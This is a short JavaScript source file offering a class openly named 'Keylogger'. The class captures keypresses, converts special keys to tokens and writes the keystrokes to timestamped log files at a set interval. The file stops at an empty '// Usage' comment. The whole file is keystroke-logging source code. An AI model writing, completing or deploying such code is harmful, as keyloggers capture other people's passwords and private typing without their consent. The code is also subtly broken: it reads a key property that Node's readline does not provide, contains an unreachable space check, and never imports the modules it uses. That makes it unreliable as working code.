class Keylogger {
    constructor(interval) {
        this.interval = interval;
        this.log = '';
        this.startDt = new Date();
        this.endDt = new Date();
        this.filename = '';
    }

    callback(event) {
        let name = event.key;
        if (name.length > 1) {
            if (name === ' ') {
                name = ' ';
            } else if (name === 'Enter') {
                name = '\n';
            } else if (name === 'Decimal') {
                name = '.';
            } else {
                name = name.replace(' ', '_');
                name = `[${name.toUpperCase()}]`;
            }
        }
        this.log += name;
    }

    updateFilename() {
        const startDtStr = this.startDt.toISOString().replace(/T/, '-').replace(/:/g, '').slice(0, 16);
        const endDtStr = this.endDt.toISOString().replace(/T/, '-').replace(/:/g, '').slice(0, 16);
        this.filename = `keylog-${startDtStr}_${endDtStr}`;
    }

    reportToFile() {
        fs.writeFileSync(`${this.filename}.txt`, this.log);
    }

    report() {
        if (this.log) {
            this.endDt = new Date();
            this.updateFilename();
            this.reportToFile();
            this.startDt = new Date();
        }
        this.log = '';
    }

    start() {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            terminal: true
        });

        rl.input.on('keypress', (char, key) => {
            this.callback(key);
            if (key.name === 'escape') {
                rl.close();
            }
        });

        setInterval(() => this.report(), this.interval);
    }
}

// Usage
